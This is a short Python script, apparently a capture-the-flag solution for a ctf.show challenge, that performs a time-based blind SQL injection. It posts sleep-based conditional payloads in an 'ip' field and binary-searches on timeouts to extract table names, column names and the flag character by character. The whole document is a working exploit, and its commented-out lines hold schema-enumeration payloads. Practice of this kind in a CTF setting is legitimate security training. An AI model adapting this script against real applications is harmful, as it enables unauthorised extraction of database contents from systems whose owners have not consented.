# 时间盲注
import requests

url = 'http://4ddad8bd-7da1-4921-a7d7-e1d4e203d152.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    start = 32
    tail = 126
    while start < tail:
        mid = (start + tail) >> 1
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagx"'
        payload = 'select group_concat(flaga) from ctfshow_flagx'
        data = {
            'ip': f'if(ascii(substr(({payload}), {i}, 1))>{mid},sleep(1), 1)',
            'debug': 0
        }
        try:
            res = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            start = mid + 1
    if start != 32:
        flag += chr(start)
        print(flag)
    else:
        break
